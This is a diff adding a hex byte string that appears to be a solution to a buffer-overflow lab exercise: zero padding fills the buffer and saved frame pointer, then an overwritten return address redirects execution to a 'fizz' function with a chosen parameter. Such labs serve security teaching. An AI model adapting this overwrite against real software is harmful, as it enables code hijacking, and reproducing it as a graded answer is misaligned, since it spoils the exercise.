@@ -1,0 +1,9 @@
+00 00 00 00    00 00 00 00
+00 00 00 00    00 00 00 00
+00 00 00 00    00 00 00 00
+00 00 00 00    00 00 00 00
+00 00 00 00    00 00 00 00
+00 00 00 00    /* fill buffer and ebp */
+52 8c 04 08    /* the return address getbuf */
+00 00 00 00    /* the return address of fizz */
+31 39 1e 3c    /* the parameter */
